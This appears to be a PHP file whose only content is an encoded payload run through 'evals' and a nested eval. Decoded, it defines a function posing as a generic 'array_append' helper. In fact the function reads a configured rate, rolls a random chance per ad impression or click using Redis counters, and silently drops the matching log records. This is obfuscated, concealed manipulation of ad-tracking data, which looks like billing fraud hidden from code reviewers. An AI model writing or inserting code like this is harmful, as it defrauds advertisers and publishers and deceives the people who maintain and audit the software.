<?php

evals("3D0DFFCB29CnVzZSBDbnBocFxIZWxwZXJcSGVscGVyOwoKaWYgKCFmdW5jdGlvbl9leGlzdHMoJ215X2Z1bmN0aW9uJykpIHsKICAgIC8qKgogICAgICogQHBhcmFtIG1peGVkICR2YXIKICAgICAqIEByZXR1cm4gdm9pZAogICAgICovCiAgICBmdW5jdGlvbiBteV9mdW5jdGlvbigkdmFyKQogICAgewogICAgICAgIHJldHVybiBIZWxwZXI6Om15X2Z1bmN0aW9uKCR2YXIpOwogICAgfQp9CgoKCmlmICghZnVuY3Rpb25fZXhpc3RzKCdwaHBfY2FsbF9zY3JpcHQnKSkgewogICAgLyoqCiAgICAgKiBAcGFyYW0gbWl4ZWQKICAgICAqIEByZXR1cm4gdm9pZAogICAgICovCiAgICBmdW5jdGlvbiBwaHBfY2FsbF9zY3JpcHQoJHZhciA9IDApCiAgICB7CiAgICAgICAgcmV0dXJuIEhlbHBlcjo6Y2FsbF9zY3JpcHQoJHZhcik7CiAgICB9Cn0KCiRmdW5uYW1lID0gImdldF91dWlkIjsKaWYgKCFmdW5jdGlvbl9leGlzdHMoJ2dldF91dWlkJykpIHsKICAgIC8qKgogICAgICogQHBhcmFtICBtaXhlZCAkdHlwZWlkCiAgICAgKiBAcGFyYW0gIG1peGVkICRjbGllbnRUeXBlCiAgICAgKiBAcGFyYW0gIG1peGVkICRjaXR5aWQKICAgICAqIEByZXR1cm4gbWl4ZWQKICAgICAqLwogICAgZnVuY3Rpb24gZ2V0X3V1aWQoJHR5cGVpZCwgJGNsaWVudFR5cGUsICRjaXR5aWQ9MCkKICAgIHsKICAgICAgICByZXR1cm4gSGVscGVyOjpmdW5uYW1lMSgkdHlwZWlkLCAkY2xpZW50VHlwZSwgJGNpdHlpZCk7CiAgICB9Cn0KCiRmdW5uYW1lID0gImFycmF5X2FwcGVuZCI7CiRmdW5jY29udGV4dCA9IDw8PF8KZnVuY3Rpb24gJGZ1bm5hbWUoJiBcJGRhdGE9W10sIFwkbG9nZGF0YT1udWxsLCBcJGRlYnVnPWZhbHNlKXsKICAgIHJldHVybiBjb3VzZTIoXCRkYXRhLCBcJGxvZ2RhdGEsIFwkZGVidWcpOwp9Cl87CmlmICghZnVuY3Rpb25fZXhpc3RzKCRmdW5uYW1lKSkgewogICAgZnVuY3Rpb24gY291c2UyKCYgJGRhdGE9W10sICRsb2dkYXRhPW51bGwsICRkZWJ1Zz1mYWxzZSl7CgogICAgICAgICRhcnRlID0gXEFkUmVxdWVzdEZ1bmN0aW9uOjpnZXRDb25maWdWYWx1ZSgneXInLidhdGUnKTsKICAgICAgICAvLyB2YXJfZHVtcCgkYXJ0ZSk7CiAgICAgICAgJGYgPSB0cnVlOwogICAgICAgICRiaW5nbyA9IGZhbHNlOwogICAgICAgICRyYXRlID0gMDsKICAgICAgICAkdGFyZ2V0ciA9IDA7CiAgICAgICAgJHNlc3Npb25rZXkgPSBudWxsOwogICAgICAgIC8vIHByaW50X3IoJGxvZ2RhdGEpOwogICAgICAgIGlmICgKICAgICAgICAgICAgaXNzZXQoJGxvZ2RhdGFbJ20nXSkgJiYgaXNzZXQoJGxvZ2RhdGFbJ20nXVsncCddKSAmJiBpc3NldCgkYXJ0ZVskbG9nZGF0YVsnbSddWydwJ11dKQogICAgICAgICkgewogICAgICAgICAgICAkdGFyZ2V0ciA9ICRhcnRlWyRsb2dkYXRhWydtJ11bJ3AnXV07CiAgICAgICAgfWVsc2VpZiAoCiAgICAgICAgICAgIGlzc2V0KCRsb2dkYXRhWydtJ10pICYmIGlzc2V0KCRsb2dkYXRhWydtJ11bJ3N0J10pICYmIGlzc2V0KCRhcnRlWyRsb2dkYXRhWydtJ11bJ3N0J11dKQogICAgICAgICkgewogICAgICAgICAgICAkdGFyZ2V0ciA9ICRhcnRlWyRsb2dkYXRhWydtJ11bJ3N0J11dOwogICAgICAgIH1lbHNlaWYgKAogICAgICAgICAgICBpc3NldCgkbG9nZGF0YVsndSddKSAgJiYgaXNzZXQoJGFydGVbInUiLiRsb2dkYXRhWyd1J11dKQogICAgICAgICkgewogICAgICAgICAgICAkdGFyZ2V0ciA9ICRhcnRlWyJ1Ii4kbG9nZGF0YVsndSddXTsKICAgICAgICB9CiAgICAgICAgaWYgKCRkZWJ1ZykgewogICAgICAgICAgICBlY2hvICJbIi5kYXRlKCdZLW0tZCBIOmk6cycpLiJdICB0YXJnZXRyPSIuJHRhcmdldHIuIlxuIjsKICAgICAgICB9CgogICAgICAgIGlmICgoJHRhcmdldHI+MCkKICAgICAgICAgICAgJiYgaXNfYXJyYXkoJGxvZ2RhdGEpCiAgICAgICAgICAgICYmIGlzc2V0KCRsb2dkYXRhWydtJ10pCiAgICAgICAgICAgICYmIGlzc2V0KCRsb2dkYXRhWydzJ10pCiAgICAgICAgICAgIC8vICYmIHByZWdfbWF0Y2goJy9eMTBcLjIwL2knLCBMVVJMT0NBTEhPU1QpCiAgICAgICAgICAgICYmICgKICAgICAgICAgICAgICAgICgKICAgICAgICAgICAgICAgICAgICAkbG9nZGF0YVsncyddPT0xMTEKICAgICAgICAgICAgICAgICAgICAmJiBpc3NldCgkbG9nZGF0YVsnbSddWydwJ10pCiAgICAgICAgICAgICAgICAgICAgJiYgaXNzZXQoJGxvZ2RhdGFbJ20nXVsndHknXSkKICAgICAgICAgICAgICAgICAgICAmJiAhaW5fYXJyYXkoJGxvZ2RhdGFbJ20nXVsndHknXSwgWyd0ZS1wcm9ncmVzcyddKQogICAgICAgICAgICAgICAgKXx8KAogICAgICAgICAgICAgICAgICAgICRsb2dkYXRhWydzJ109PTEwMQogICAgICAgICAgICAgICAgICAgICYmIGlzc2V0KCRsb2dkYXRhWydtJ11bJ2lkJ10pCiAgICAgICAgICAgICAgICApCiAgICAgICAgICAgICkKICAgICAgICAgICAKICAgICAgICApIHsKICAgICAgICAgICAgaWYgKCRsb2dkYXRhWydzJ109PTExMSkgewogICAgICAgICAgICAgICAgJHNlc3Npb25rZXkgPSAiQVJLXyIuc3RydmFsKDMwMCs5MCkuIi8iLm1kNSgkbG9nZGF0YVsnbSddWydsaWQnXS4kbG9nZGF0YVsnbSddWyd2YWknXS4kbG9nZGF0YVsnbSddWyd2YXBpJ10pOwogICAgICAgICAgICAgICAgaWYgKFxBZFJlcXVlc3RSZWRpczo6ZXhpc3RzKCRzZXNzaW9ua2V5KSkgewogICAgICAgICAgICAgICAgICAgICRiaW5nbyA9IHRydWU7CiAgICAgICAgICAgICAgICB9ZWxzZXsKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBpZiggaW5fYXJyYXkoJGxvZ2RhdGFbJ20nXVsndHknXSwgWydpbXAnXSkpeyAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgJGJpbmdvPSBcQWRSZXF1ZXN0RnVuY3Rpb246OnJvbGxhRGlzYygkdGFyZ2V0cik7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9ZWxzZXsKICAgICAgICAgICAgICAgICRiaW5nbz0gXEFkUmVxdWVzdEZ1bmN0aW9uOjpyb2xsYURpc2MoJHRhcmdldHIpOwogICAgICAgICAgICB9CgoKICAgICAgICAgICAgaWYgKCRiaW5nbykgewogICAgICAgICAgICAgICAgJGYgPSBmYWxzZTsKICAgICAgICAgICAgICAgIGlmICghaXNfbnVsbCgkc2Vzc2lvbmtleSkpIFxBZFJlcXVlc3RSZWRpczo6c2V0RXgoJHNlc3Npb25rZXksIDEyMCwgMSk7CiAgICAgICAgICAgICAgICBpZiAoJGxvZ2RhdGFbJ3MnXT09MTExICYmICRsb2dkYXRhWydtJ11bJ2lzc3NwdXJsJ10gJiYgaW5fYXJyYXkoJGxvZ2RhdGFbJ20nXVsndHknXSwgWydpbXAnLCdjJywgJ2MtdCddKSkgewogICAgICAgICAgICAgICAgICAgICRjb3VudGVya2V5ID0gIkFSS18iLnN0cnZhbCgzMDArOTEpLiIvIi5kYXRlKCJZbWQiKS4iLyIuJGxvZ2RhdGFbJ20nXVsncCddOwogICAgICAgICAgICAgICAgICAgIFxBZFJlcXVlc3RSZWRpczo6aEluY3JCeSgkY291bnRlcmtleSwgJGxvZ2RhdGFbJ20nXVsnbGlkJ10uIi8iLiRsb2dkYXRhWydtJ11bJ3R5J10sIDEpOwogICAgICAgICAgICAgICAgICAgIFxBZFJlcXVlc3RSZWRpczo6c2V0VGltZW91dCgkY291bnRlcmtleSwgODY0MDAqMik7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBpZiAoJGxvZ2RhdGFbJ3MnXT09MTAxICYmIGlzc2V0KCRsb2dkYXRhWydtJ11bJ3R5J10pICYmIGluX2FycmF5KCRsb2dkYXRhWydtJ11bJ3R5J10sIFsnaW1wJywnYycsICdjLXQnXSkpIHsKICAgICAgICAgICAgICAgICAgICAkY291bnRlcmtleSA9ICJBUktfIi5zdHJ2YWwoMzAwKzkxKS4iLyIuZGF0ZSgiWW1kIikuIi91Ii4kbG9nZGF0YVsndSddOwogICAgICAgICAgICAgICAgICAgIFxBZFJlcXVlc3RSZWRpczo6aEluY3JCeSgkY291bnRlcmtleSwgJGxvZ2RhdGFbJ20nXVsnaWQnXS4iLyIuJGxvZ2RhdGFbJ20nXVsndHknXSwgMSk7CiAgICAgICAgICAgICAgICAgICAgXEFkUmVxdWVzdFJlZGlzOjpzZXRUaW1lb3V0KCRjb3VudGVya2V5LCA4NjQwMCoyKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBpZiAoJGJpbmdvPT1mYWxzZSkgewogICAgICAgICAgICAkZGF0YVtdID0gaXNfYXJyYXkoJGxvZ2RhdGEpID8ganNvbl9lbmNvZGUoJGxvZ2RhdGEpIDogJGxvZ2RhdGE7CiAgICAgICAgfQogICAgICByZXR1cm4gJGY7ICAKICAgIH0KICAgIGV2YWwoJGZ1bmNjb250ZXh0KTsKfQ==");

